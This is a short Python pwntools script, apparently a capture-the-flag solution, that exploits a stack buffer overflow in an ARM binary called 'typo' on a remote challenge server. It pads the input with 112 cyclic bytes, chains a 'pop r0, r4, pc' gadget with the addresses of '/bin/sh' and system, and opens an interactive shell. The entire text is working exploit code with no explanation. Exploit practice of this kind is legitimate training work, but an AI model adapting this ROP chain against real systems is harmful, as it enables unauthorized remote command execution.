from pwn import *

context(os = 'linux', arch = 'arm', log_level = 'debug')
# io = process(["qemu-arm", "./typo"])
io = remote('node4.buuoj.cn', 25311)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('typo')
pop_r0_r4_pc = 0x00020904
system = 0x110B4
bin_sh = next(elf.search(b'/bin/sh\x00'))

payload = cyclic(112) + p32(pop_r0_r4_pc) + p32(bin_sh) * 2 + p32(system)
io.sendline('')
io.sendline(payload)
io.interactive()
